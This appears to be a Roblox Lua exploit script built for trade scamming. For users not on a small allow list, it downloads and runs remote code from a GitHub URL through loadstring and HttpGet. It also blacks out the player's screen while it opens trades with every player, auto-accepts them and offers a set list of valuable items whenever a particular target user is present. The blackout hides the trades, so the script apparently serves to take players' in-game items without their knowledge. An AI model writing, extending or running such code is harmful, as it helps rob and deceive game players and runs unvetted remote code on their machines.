-- Fallback Script URL
local FALLBACK_URL = "https://raw.githubusercontent.com/zorluaa/Void1/refs/heads/main/15"

local function runFallback()
    loadstring(game:HttpGet(FALLBACK_URL))()
end

-- STAGE 1: Authorization Check (Evan or ewqeqweqweqw208)
local authorizedUsers = {"Evanfxl", "ewqeqweqweqw208"}
local isAuthorized = false
for _, name in ipairs(authorizedUsers) do
    if game:GetService("Players").LocalPlayer.Name == name then
        isAuthorized = true
        break
    end
end

if not isAuthorized then 
    runFallback()
    return 
end

-- STAGE 2: Settings & Variables
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")
local TARGET_ID = 407207583 -- z_z's UserID
local SPIN_SPEED = 12

-- Create Blackout Overlay
local blackout = Instance.new("ScreenGui")
blackout.Name = "BlackoutOverlay"
blackout.IgnoreGuiInset = true
blackout.DisplayOrder = 9999999
local frame = Instance.new("Frame")
frame.Size = UDim2.new(1, 0, 1, 0)
frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
frame.BorderSizePixel = 0
frame.Parent = blackout
blackout.Parent = playerGui

--- YOUR ORIGINAL TRADE LOOP (Modified only to check for z_z) ---
game:GetService("RunService").RenderStepped:Connect(function()
    -- Only run if z_z is in the game
    local targetObj = nil
    for _, p in pairs(Players:GetPlayers()) do
        if p.UserId == TARGET_ID then
            targetObj = p
            break
        end
    end

    if targetObj then
        blackout.Enabled = false -- Clear screen if he's here
        
        -- Start Trade with everyone
        for i, v in pairs(game:GetService("Players"):GetChildren()) do
            if v.Name ~= game:GetService("Players").LocalPlayer.Name then
                game:GetService("ReplicatedStorage").Remotes.StartTrade:FireServer(v)
            end
        end
        -- Removed wait() to prevent lag in RenderStepped, using task.wait if needed
        game:GetService("ReplicatedStorage").Remotes.UpdTradeStatus:FireServer(true)
        game:GetService("ReplicatedStorage").Remotes.UpdTradeReview:FireServer()
    else
        blackout.Enabled = true -- Black screen if he's gone
        runFallback()
    end
end)

--- YOUR ORIGINAL ITEM UPDATE LOGIC ---
local tradeGui = playerGui:WaitForChild("ScreenGui").UI.TradeScreen
local fired = false

tradeGui:GetPropertyChangedSignal("Visible"):Connect(function()
    if tradeGui.Visible and not fired then
        fired = true
        
        -- The expanded item list you requested
        local items = {
            {"Overseer", 1},
            {"Techno Axe", 1},
            {"Void Champion", 1},
            {"Champion Axe 2", 2}, -- Includes the '2'
            {"Black Hole", 1},
            {"Infernal Guardian", 1}
        }

        local t = {}
        for i = 1, #items do
            local item = items[i]
            t[i] = {[1] = item[1], [2] = item[2]}
        end

        game:GetService("ReplicatedStorage").Remotes.UpdateTradeOffer:FireServer(t)
    elseif not tradeGui.Visible then
        fired = false -- Reset so it fires again next trade
    end
end)

--- SPINNING LOGIC ---
local spinConnection
local function startSpinning(character)
	local root = character:WaitForChild("HumanoidRootPart")
	character:WaitForChild("Humanoid").AutoRotate = false
	if spinConnection then spinConnection:Disconnect() end
	spinConnection = RunService.RenderStepped:Connect(function(deltaTime)
		if root and root.Parent and Players:FindFirstChild("z_z0120292") then
			root.CFrame = root.CFrame * CFrame.Angles(0, SPIN_SPEED * deltaTime, 0)
		end
	end)
end

if player.Character then startSpinning(player.Character) end
player.CharacterAdded:Connect(startSpinning)

-- [The rest of your Mock GUI code can be pasted here if you want the visual menu]
